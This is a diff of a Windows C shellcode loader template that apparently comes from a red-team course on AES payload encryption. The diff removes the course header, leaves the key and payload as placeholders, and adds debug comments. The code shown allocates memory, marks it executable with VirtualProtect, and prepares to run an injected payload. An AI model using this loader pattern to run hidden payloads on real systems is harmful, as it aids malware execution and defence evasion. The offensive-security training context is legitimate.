@@ -1,11 +1,3 @@
-/*
-
- Red Team Operator course code template
- payload encryption with AES
- 
- author: reenz0h (twitter: @sektor7net)
-
-*/
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -53,8 +45,8 @@ int main(void) {
 	HANDLE th;
     DWORD oldprotect = 0;
 
-	char key[] = 
-	unsigned char calc_payload[] = 
+	char key[] = //Include your key here
+	unsigned char calc_payload[] = //Include your payload here
 	unsigned int calc_len = sizeof(calc_payload);
 	
 	// Allocate memory for payload
@@ -62,6 +54,7 @@ int main(void) {
 	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
 	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
 
+	// Debug functionality
 	printf("\nHit me 1st!\n");
 	getchar();
 
@@ -74,6 +67,7 @@ int main(void) {
 	// Make the buffer executable
 	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
 
+	// Debug functionality
 	printf("\nHit me 2nd!\n");
 	getchar();
 
